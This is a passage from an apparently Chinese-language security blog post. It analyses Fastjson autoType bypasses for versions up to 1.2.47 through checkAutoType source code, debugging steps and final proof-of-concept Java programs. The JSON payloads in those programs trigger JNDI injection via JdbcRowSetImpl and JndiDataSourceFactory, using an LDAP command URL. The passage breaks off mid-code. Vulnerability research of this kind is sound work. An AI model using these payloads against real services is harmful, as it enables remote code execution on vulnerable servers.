    &#125;
&#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-43"><a href="#Fastjson1-2-25-1-2-43" class="headerlink" title="Fastjson1.2.25-1.2.43"></a>Fastjson1.2.25-1.2.43</h2><p>条件：开启AutoType</p>
<p>环境搭建</p>
<pre><code class="xml">&lt;dependency&gt;
      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
      &lt;version&gt;1.2.43&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre>
<p>在1.2.43版本中针对1.2.42的绕过方式进行了修复，修复的地方还是在<code>checkAutoType()</code>方法</p>
<p>1.2.42版本</p>
<pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
        if (typeName == null) &#123;
            return null;
        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;
            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
            Class&lt;?&gt; clazz = null;
            long BASIC = -3750763034362895579L;
            long PRIME = 1099511628211L;
            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;
                className = className.substring(1, className.length() - 1);
            &#125;
</code></pre>
<p>1.2.43版本</p>
<pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
        if (typeName == null) &#123;
            return null;
        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;
            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
            Class&lt;?&gt; clazz = null;
            long BASIC = -3750763034362895579L;
            long PRIME = 1099511628211L;
            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;
                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) &#123;
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                &#125;

                className = className.substring(1, className.length() - 1);
            &#125;
</code></pre>
<p>对比可以看到，在第一次去除L开头和<code>;</code>结尾的步骤中，1.2.43版本还进行多一次检测，如果“去头去尾”后还检测到L开头和<code>;</code>结尾，那就直接报出错误，<code>autoType is not support. Lxxxxxxxx;</code></p>
<p>主要的变化就这样，后面的逻辑和之前的一样</p>
<h3 id="绕过分析-2"><a href="#绕过分析-2" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>走<code>L+;</code>这条路似乎是不行了，再看看loadClass()</p>
<pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;
    if (className != null &amp;&amp; className.length() != 0) &#123;
        Class&lt;?&gt; clazz = (Class)mappings.get(className);
        if (clazz != null) &#123;
            return clazz;
        &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;
            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
            return Array.newInstance(componentType, 0).getClass();
        &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;
            String newClassName = className.substring(1, className.length() - 1);
            return loadClass(newClassName, classLoader);
</code></pre>
<p><code>L+;</code>这条路走不了，可以试试<code>[</code>这条路，但是在1.2.41的时候就知道它是会报错的</p>
<p>比如</p>
<pre><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;
</code></pre>
<p>出现报错</p>
<pre><code>Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#39;[&#39;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,&quot;AutoCommit&quot;:true&#125;

翻译：
线程中的异常 &quot;main&quot; com.alibaba.fastjson.JSONException: 期望 &#39;[&#39;, 但是得到了 ,, 位置 42, JSON 数据 : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,&quot;AutoCommit&quot;:true&#125;
</code></pre>
<p>大概就是说逗号<code>,</code>的这个位置，程序期望得到的是’[‘ ， 那就按要求改</p>
<pre><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;
</code></pre>
<p>然后还继续报错</p>
<pre><code class="tex">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos 43, fastjson-version 1.2.43

翻译

线程中的异常 &quot;main&quot; com.alibaba.fastjson.JSONException: 语法错误，期望 &#123;，实际为字符串，位置 43，fastjson 版本 1.2.43
</code></pre>
<p>就是说这个<code>[</code>号的后面应该加一个<code>&#123; </code> ,那就加上</p>
<pre><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;
</code></pre>
<p>然后就成功加载了这个类，进行了JNDI注入</p>
<p>额~，这似乎有点意外</p>
<p>调试分析</p>
<p>因为ClassName &#x3D; [com.sun.rowset.JdbcRowSetImpl 肯定能够绕过黑名单，进入loadClass,返回Array.newInstance(componentType, 0).getClass();</p>
<p>经过了<code>checkAutoType</code>的打磨后，得到的clazz如下</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808145519743.png" alt="image-20230808145519743"></p>
<p>往下进入了nextToken()</p>
<pre><code class="java">if (clazz != null) &#123;
    lexer.nextToken(16);
</code></pre>
<p>因为<code>&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;</code>检测到了第二个<code>[</code>,修改了原来的token值，原来的值是4，修改为了 14</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808145755081.png" alt="image-20230808145755081"></p>
<p>返回继续往下，这里是获取到一个和数组有关的反序列化器进行反序列化</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808150052682.png" alt="image-20230808150052682"></p>
<p>跟进deserialze</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808150537793.png" alt="image-20230808150537793"></p>
<p>这里利用了<code>getComponentType()</code>去解析这个类名，获取到了com.sun.rowset.JdbcRowSetImpl  </p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808151129461.png" alt="image-20230808151129461"></p>
<p>然后就是进入parseArray进行解析，跟进查看</p>
<pre><code class="java">if (token != 14) &#123;
    throw new JSONException(&quot;exepct &#39;[&#39;, but &quot; + JSONToken.name(token) + &quot;, &quot; + this.lexer.info());
&#125; 
</code></pre>
<p>之前报错是因为token！&#x3D;14，限制token&#x3D;&#x3D;14就不报错了</p>
<p>往下来到这个if语句，进入了else语句进行反序列化</p>
<pre><code class="java">if (this.lexer.token() == 8) &#123;
    this.lexer.nextToken();
    val = null;
&#125; else &#123;
    val = ((ObjectDeserializer)deserializer).deserialze(this, type, i);
&#125;
</code></pre>
<p>这里进行反序列化使用的类是<code>JavaBeanDeserializer</code></p>
<p>反序列化后就成功弹出计算器了</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808152146544.png" alt="image-20230808152146544"></p>
<p>最后的POC</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
public class App
&#123;
    public static void main( String[] args ) &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;
        JSON.parseObject(payload);

    &#125;
&#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-45"><a href="#Fastjson1-2-25-1-2-45" class="headerlink" title="Fastjson1.2.25-1.2.45"></a>Fastjson1.2.25-1.2.45</h2><p>条件：开启AutoType，并且mybatis&lt;3.5</p>
<p>环境搭建</p>
<pre><code class="xml">&lt;dependency&gt;
      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
      &lt;version&gt;1.2.45&lt;/version&gt;
    &lt;/dependency&gt;

    &lt;dependency&gt;
      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
      &lt;version&gt;3.4.6&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre>
<p>在1.2.44版本的修复中，修复了<code>[</code>绕过的漏洞</p>
<pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
    if (typeName == null) &#123;
        return null;
    &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;
        String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
        Class&lt;?&gt; clazz = null;
        long BASIC = -3750763034362895579L;
        long PRIME = 1099511628211L;
        long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
        if (h1 == -5808493101479473382L) &#123;
            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
        &#125; else if ((h1 ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;
            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
       
</code></pre>
<p>可以看到，这里先处理了<code>[</code>开头的类名，如果是这里符号开头的话，直接报错</p>
<p>然后再检测开头和结尾，如果是<code>L</code>  开头<code>;</code>结尾的，也直接报错</p>
<h3 id="绕过分析-3"><a href="#绕过分析-3" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>loadClass的两条路直接被堵死，这能和黑名单硬刚了，找一个黑名单里面没有的，可利用的类</p>
<p>因为黑名单都是hashcode，需要参考<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a> 这个项目，里面是作者找出的fastjson中hashcode对应的类</p>
<p>这个版本利用的是<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>这个类，这个类不在黑名单里面，可过检测</p>
<p>这里使用的是setProperties这个方法，参数是Properties类型的继承自Hashtable</p>
<pre><code class="java">public void setProperties(Properties properties) &#123;
    try &#123;
        Properties env = getEnvProperties(properties);
        InitialContext initCtx;
        if (env == null) &#123;
            initCtx = new InitialContext();
        &#125; else &#123;
            initCtx = new InitialContext(env);
        &#125;

        if (properties.containsKey(&quot;initial_context&quot;) &amp;&amp; properties.containsKey(&quot;data_source&quot;)) &#123;
            Context ctx = (Context)initCtx.lookup(properties.getProperty(&quot;initial_context&quot;));
            this.dataSource = (DataSource)ctx.lookup(properties.getProperty(&quot;data_source&quot;));
        &#125; else if (properties.containsKey(&quot;data_source&quot;)) &#123;
            this.dataSource = (DataSource)initCtx.lookup(properties.getProperty(&quot;data_source&quot;));
        &#125;

    &#125; catch (NamingException var5) &#123;
        throw new DataSourceException(&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot; + var5, var5);
    &#125;
&#125;
</code></pre>
<p>这个方法可以在反序列化自动调用</p>
<pre><code class="java">//Hashtable
public synchronized boolean containsKey(Object key) &#123;
    Entry&lt;?,?&gt; tab[] = table;
    int hash = key.hashCode();
    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;
        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;
            return true;
        &#125;
    &#125;
    return false;
&#125;
</code></pre>
<p><code>properties.containsKey(&quot;initial_context&quot;) 和 properties.containsKey(&quot;data_source&quot;)</code>这里的意思是检测这个<code>properties</code>是否存在initial_context或者data_source</p>
<p>如果两个都存在，则会进入第一个if语句，如果只存在<code>data_source</code>, 则进入else分支</p>
<p>进入if 语句后，就能够调用<code>lookup</code>进行JNDI注入了</p>
<p>查看<code>properties.getProperty(&quot;data_source&quot;)</code>是否可控</p>
<pre><code class="java">public String getProperty(String key) &#123;
    Object oval = super.get(key);
    String sval = (oval instanceof String) ? (String)oval : null;
    return ((sval == null) &amp;&amp; (defaults != null)) ? defaults.getProperty(key) : sval;
&#125;
</code></pre>
<p>首先从父类Hashtable获取<code>key</code>对应的值，保存到oval，再判断这个oval是否是String类型的实例，如果是进行类型转换，如果不上则sval赋值为null</p>
<p>如果((sval &#x3D;&#x3D; null) &amp;&amp; (defaults !&#x3D; null))&#x3D;&#x3D;true 则返回defaults.getProperty(key)，否则返回sval</p>
<p>所以只有能够控制键值对中<code>initial_context</code>或者<code>data_source</code>的对应的值就能够利用lookup进行JNDI注入</p>
<p>下一步就是如何传入参数</p>
<pre><code class="java">public void setProperties(Properties properties)
</code></pre>
<p>已经知道这个setter方法可以自动调用了，这个参数是键值对,那就传入 一个键值对</p>
<pre><code class="java">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;
</code></pre>
<p>或者</p>
<pre><code class="java">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;aaa\&quot;,\&quot;initial_context\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;
</code></pre>
<p>这个需要开启AutoType，如果不开启，在checkAutoType里面无法返回已经加载的这个类</p>
<p>最终POC</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;
public class App
&#123;
    public static void main( String[] args ) &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;
        
//        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;aaa\&quot;,\&quot;initial_context\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;
        JSON.parseObject(payload);

    &#125;
&#125;
</code></pre>
<h2 id="Fastjson1-2-25-1-2-47"><a href="#Fastjson1-2-25-1-2-47" class="headerlink" title="Fastjson1.2.25-1.2.47"></a>Fastjson1.2.25-1.2.47</h2><p>环境搭建</p>
<pre><code class="xml">&lt;dependency&gt;
  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
  &lt;version&gt;1.2.47&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>在这个版本中，为了修复 上个版本的漏洞，将<code>org.apache.ibatis.datasource</code>添加到了黑名单</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808210641210.png" alt="image-20230808210641210"></p>
<h3 id="绕过分析-4"><a href="#绕过分析-4" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>如果找不到一个不存在于黑名单的可利用类，只能在处理过程寻找漏洞，绕过黑白名单检测</p>
<p>因为阻挡我们利用的地方主要是<code>checkAutoType</code>这个方法，所以需要重新审计一下</p>
<pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
    if (typeName == null) &#123;
        return null;
    &#125;

    if (typeName.length() &gt;= 128 || typeName.length() &lt; 3) &#123;
        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
    &#125;

    String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
    Class&lt;?&gt; clazz = null;
</code></pre>
<p>首先这个方法的开头，是对typeName进行一些简单的检测可处理，检测typeName是否为空，检测typeName长度，然后将<code>$</code>替换为<code>.</code></p>
<p>往下：</p>
<pre><code class="java">final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
if (h1 == 0xaf64164c86024f1aL) &#123; // [
    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
&#125;

if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123;
    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
&#125;

final long h3 = (((((BASIC ^ className.charAt(0))
        * PRIME)
        ^ className.charAt(1))
        * PRIME)
        ^ className.charAt(2))
        * PRIME;
</code></pre>
<p>这里就是对1.2.43之前的两个绕过方式进行检测，这里无法绕过了，继续往下看</p>
<pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;
    long hash = h3;
    for (int i = 3; i &lt; className.length(); ++i) &#123;
        hash ^= className.charAt(i);
        hash *= PRIME;
        if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
            if (clazz != null) &#123;
                return clazz;
            &#125;
        &#125;
        if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;
            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
        &#125;
    &#125;
&#125;
</code></pre>
<p>如果开启了<code>autoType</code>,就会进入这个if语句，先进行白名单检测，如果这个类再白名单里面，直接加载并返回，如果找不到，就去黑名单里面找，还找不到就继续往下</p>
<pre><code class="java">if (clazz == null) &#123;
    clazz = TypeUtils.getClassFromMapping(typeName);
&#125;

if (clazz == null) &#123;
    clazz = deserializers.findClass(typeName);
&#125;
if (clazz != null) &#123;
    if (expectClass != null
            &amp;&amp; clazz != java.util.HashMap.class
            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
    &#125;
    return clazz;
&#125;
</code></pre>
<p>这一段就是当<code>autoType</code>未开启或者<code>autoType</code>开启后在黑白名单中都找不到的时候 ，尝试通过<code>TypeUtils.getClassFromMapping</code>或者<code>deserializers.findClass</code>来获取类，如果能够找到，进入第三个if语句，这里存在第二个<code>return clazz</code>,但是要确保不会进入里面的if语句</p>
<p>继续往下：</p>
<pre><code class="java">if (!autoTypeSupport) &#123;
    long hash = h3;
    for (int i = 3; i &lt; className.length(); ++i) &#123;
        char c = className.charAt(i);
        hash ^= c;
        hash *= PRIME;

        if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) &#123;
            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
        &#125;

        if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;
            if (clazz == null) &#123;
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
            &#125;

            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;
                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
            &#125;

            return clazz;
        &#125;
    &#125;
&#125;
</code></pre>
<p>这里是没有开启<code>autoType</code>的处理，首先进行一波黑名单过滤，再进行白名单检查，如果存在于白名单中那就会出现第三个<code>return clazz</code></p>
<p>后面的已经不重要了，因为已经经过黑白名单了，如果还想往后面走，只能找到一个新的利用类</p>
<p>经过前面的分析发现，无论是否开启<code>autoType</code>,都会经过黑白名单检查，但是在未开启<code>autoType</code>的时候，在进入<code>if (!autoTypeSupport)</code>之前是存在一个<code>return clazz</code>的，也就是第二个<code>return clazz</code>,</p>
<p>autoType开启的情况下如果<code>TypeUtils.getClassFromMapping(typeName) != null</code>，也可以跳过黑名单检查进入第二个<code>return clazz</code></p>
<pre><code class="java">if (clazz == null) &#123;
    clazz = TypeUtils.getClassFromMapping(typeName);
&#125;

if (clazz == null) &#123;
    clazz = deserializers.findClass(typeName);
&#125;
if (clazz != null) &#123;
    if (expectClass != null
            &amp;&amp; clazz != java.util.HashMap.class
            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
    &#125;
    return clazz;
&#125;
</code></pre>
<p>如果能在进入黑白名单检查之前就返回出去，那就不需要经过后面的黑白名单检查了</p>
<p>要实现这个，首先要实现在<code>TypeUtils.getClassFromMapping(typeName)</code>或者<code>deserializers.findClass(typeName);</code>得到clazz</p>
<p>还要不进入</p>
<pre><code class="java">if (expectClass != null
            &amp;&amp; clazz != java.util.HashMap.class
            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
    &#125;
</code></pre>
<p>先看看<code>TypeUtils.getClassFromMapping(typeName)</code></p>
<pre><code class="java">private static ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = new ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(16, 0.75f, 1);
public static Class&lt;?&gt; getClassFromMapping(String className)&#123;
    return mappings.get(className);
&#125;
</code></pre>
<p>这个是从<code>mappings</code>获取这个类，是一个MAP对象，那就寻找<code>mappings.put()</code>的地方，看看哪里可以将我们需要的类存进mappings里面</p>
<p>然后找到能利用的只有loadClass这个地方</p>
<pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;
    .....
    try&#123;
        if(classLoader != null)&#123;
            clazz = classLoader.loadClass(className);
            if (cache) &#123;
                mappings.put(className, clazz);//------&gt;看这里
            &#125;
            return clazz;
        &#125;
    &#125; catch(Throwable e)&#123;
        e.printStackTrace();
        // skip
    &#125;
    try&#123;
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader)&#123;
            clazz = contextClassLoader.loadClass(className);
            if (cache) &#123;
                mappings.put(className, clazz);//------&gt;看这里
            &#125;
            return clazz;
        &#125;
    &#125; catch(Throwable e)&#123;
        // skip
    &#125;
    try&#123;
        clazz = Class.forName(className);
        mappings.put(className, clazz);//------&gt;看这里
        return clazz;  
    &#125; catch(Throwable e)&#123;
        // skip
    &#125;
    return clazz;
&#125;
</code></pre>
<p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）</p>
<p>下一步就是寻找哪里调用了<code>loadClass(String className, ClassLoader classLoader, boolean cache)</code></p>
<p>找到几个，其中有是在<code>checkAutoType</code>里面的，可直接Pass,剩下的就是</p>
<pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;
        return loadClass(className, classLoader, true);
    &#125;
</code></pre>
<p>再寻找哪里调用了<code>loadClass(String className, ClassLoader classLoader)</code></p>
<p>然后找到<code>com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):335</code></p>
<pre><code class="java">if (clazz == Class.class) &#123;
            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
        &#125;
</code></pre>
<p>这个方法的代码很长，需要一步一步往上分析</p>
<p>要运行到此处并且控制参数<code>strVal</code>为恶意类名，需要保证<code>clazz == Class.class</code>,这个clazz来自方法参数<code>deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)</code></p>
<p>然后往上查看<code>strVal</code>的来源</p>
<pre><code class="java">String strVal;

if (objVal == null) &#123;
    strVal = null;
&#125; else if (objVal instanceof String) &#123;
    strVal = (String) objVal;
&#125; else &#123;
    ......
&#125;
</code></pre>
<p>很明显的看到这个<code>strVal</code>的值来自<code>objVal</code> </p>
<p>继续往上寻找<code>objVal</code>的来源</p>
<pre><code class="java">Object objVal;
if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;
    parser.resolveStatus = DefaultJSONParser.NONE;
    parser.accept(JSONToken.COMMA);
    if (lexer.token() == JSONToken.LITERAL_STRING) &#123;
        if (!&quot;val&quot;.equals(lexer.stringVal())) &#123;
            throw new JSONException(&quot;syntax error&quot;);
        &#125;
        lexer.nextToken();
    &#125; else &#123;
        throw new JSONException(&quot;syntax error&quot;);
    &#125;
    parser.accept(JSONToken.COLON);
    objVal = parser.parse();
    parser.accept(JSONToken.RBRACE);
&#125; else &#123;
    objVal = parser.parse();
&#125;
</code></pre>
<p>这段代码中判断<code>parser.resolveStatus == DefaultJSONParser.TypeNameRedirect</code>,如果为false，直接 <code>objVal = parser.parse();</code></p>
<p>如果为true，进入if语句，使用lexer判断当前的 token 是否为 JSONToken.LITERAL_STRING（字符串类型的值）如果是，再判断是否为”val“,不是则报错 </p>
<p><code>parser.accept(JSONToken.COLON);</code>中的<code>JSONToken.COLON</code>是冒号<code>:</code> ，<code>JSONToken.RBRACE</code>是右大括号；</p>
<pre><code class="java">parser.accept(JSONToken.COLON);
    objVal = parser.parse();
    parser.accept(JSONToken.RBRACE);
</code></pre>
<p>这段大概的意思是将json字符串中val对应的值赋给objVal，例如{“val”:”xxx”} 中的xxx ,这里可以控制为我们需要的恶意类名<strong>“val”:”恶意类名”</strong></p>
<p>根据前面的分析还需要<code>clazz == Class.class</code>  ,这个clazz可以为<code>java.lang.Class</code></p>
<p>下一步就是寻找哪里调用了这个<code>deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)</code></p>
<p>查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如json解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
<p>需要进入<code>@type</code>的那层if判断，在这个if语句的最后：</p>
<pre><code class="java">Object obj = deserializer.deserialze(this, clazz, fieldName);
</code></pre>
<p>分析到这里，假如利用的恶意类为<code>com.sun.rowset.JdbcRowSetImpl</code>  ,   初步的POC如下</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;
</code></pre>
<p>经过调试发现<code>com.sun.rowset.JdbcRowSetImpl</code>已经put到了<code>mappings</code>中了</p>
<p>现在只是将恶意类的类名加入了<code>mappings</code>里面还需要进一步的利用</p>
<p>com.sun.rowset.JdbcRowSetImpl的利用如下：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,&quot;AutoCommit&quot;:true&#125;
</code></pre>
<p>两者结合一下</p>
<pre><code class="json">&#123;
    &quot;a&quot;:&#123;
        &quot;@type&quot;:&quot;java.lang.Class&quot;,
        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,
    &quot;b&quot;:&#123;
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,
        &quot;AutoCommit&quot;:true
    &#125;
&#125;
</code></pre>
<p>这个POC可开启<code>autoType</code>,因为开启autoType后，第一次进入checkAutoType(),class是<code>java.lang.Class</code>,不在黑白名单中，不会被拦截</p>
<p>第一次进入checkAutoType(), class是<code>com.sun.rowset.JdbcRowSetImpl</code>  ，因为TypeUtils.getClassFromMapping(typeName) ！&#x3D; null</p>
<p>不会进行黑名单检查</p>
<p>如果不开启<code>autoType</code> ,还没有进行黑白名单检查就已经return calzz了</p>
<p>最终POC:</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
public class App
&#123;
    public static void main( String[] args ) &#123;
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = &quot;&#123;\n&quot; +
                &quot;    \&quot;a\&quot;:&#123;\n&quot; +
                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +
                &quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\n&quot; +
                &quot;    \&quot;b\&quot;:&#123;\n&quot; +
                &quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +
                &quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\n&quot; +
                &quot;        \&quot;AutoCommit\&quot;:true\n&quot; +
                &quot;    &#125;\n&quot; +
                &quot;&#125;&quot;;
        JSON.parseObject(payload);

    &#125;
&#125;
</code></pre>
<p>TemplatesImpl利用链：(建议使用这个利用链，不受JDK版本限制)</p>
<pre><code class="java">package org.example;
import com.alibaba.fastjson.JSON;
import java.io.*;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import com.alibaba.fastjson.parser.JSONScanner;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
public class App
&#123;
